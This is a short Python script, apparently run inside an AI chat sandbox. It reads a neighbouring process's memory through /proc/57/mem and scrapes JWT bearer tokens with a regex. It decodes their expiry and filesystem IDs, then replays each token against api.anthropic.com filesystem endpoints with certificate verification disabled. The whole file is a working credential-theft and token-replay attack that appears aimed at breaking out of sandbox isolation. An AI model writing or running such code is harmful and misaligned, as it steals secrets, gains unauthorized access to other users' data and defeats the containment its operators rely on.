import re, base64, json, time, socket, ssl

cands = set()
try:
    maps = open("/proc/57/maps").read()
    mem = open("/proc/57/mem", "rb", buffering=0)
    for line in maps.splitlines():
        m = re.match(r"([0-9a-f]+)-([0-9a-f]+) (\S+)", line)
        if not m: continue
        a, b = int(m.group(1), 16), int(m.group(2), 16)
        try:
            mem.seek(a); d = mem.read(min(b - a, 120_000_000))
        except Exception: continue
        for mm in re.finditer(rb"eyJ[A-Za-z0-9_\-]{10,}(?:\.[A-Za-z0-9_\-]{10,}){2}", d):
            cands.add(mm.group().decode())
except Exception as e: print("mem ERR", e)

toks = []
for j in cands:
    try:
        q = j.split(".")[1]; q += "=" * (-len(q) % 4)
        pl = json.loads(base64.urlsafe_b64decode(q))
        toks.append((pl.get("exp", 0), pl.get("iat", 0), pl, j))
    except Exception: pass

print("decoded tokens:", len(toks))
now = time.time()
print("now(gm):", time.strftime("%Y-%m-%d %H:%M:%S", time.gmtime(now)))
for exp, iat, pl, j in sorted(toks, key=lambda x: -x[0]):
    print("  exp=%s iat=%s fs=%s len=%d" % (
        time.strftime("%m-%d %H:%M", time.gmtime(exp)),
        time.strftime("%m-%d %H:%M", time.gmtime(iat)),
        pl.get("filesystem_id", "?")[-8:], len(j)))

def https(path, tok):
    ctx = ssl.create_default_context(); ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
    try:
        s = socket.create_connection(("api.anthropic.com", 443), 6)
        s = ctx.wrap_socket(s, server_hostname="api.anthropic.com")
        req = ("GET %s HTTP/1.1\r\nHost: api.anthropic.com\r\nConnection: close\r\n"
               "Authorization: Bearer %s\r\n\r\n" % (path, tok))
        s.sendall(req.encode())
        d = b""
        while True:
            try:
                c = s.recv(4096)
                if not c: break
                d += c
            except Exception: break
        s.close(); return d.split(b"\r\n")[0].decode()
    except Exception as e: return "ERR:" + str(e)

print("\n### try each token on /v1/fs/...")
for exp, iat, pl, j in sorted(toks, key=lambda x: -x[0]):
    fid = pl.get("filesystem_id", "claude_chat_017x6Rew9HD5XskTyPN9CYyR")
    st = https("/v1/fs/%s" % fid, j)
    print("  exp=%s fs=%s -> %s" % (time.strftime("%m-%d %H:%M", time.gmtime(exp)), fid[-8:], st))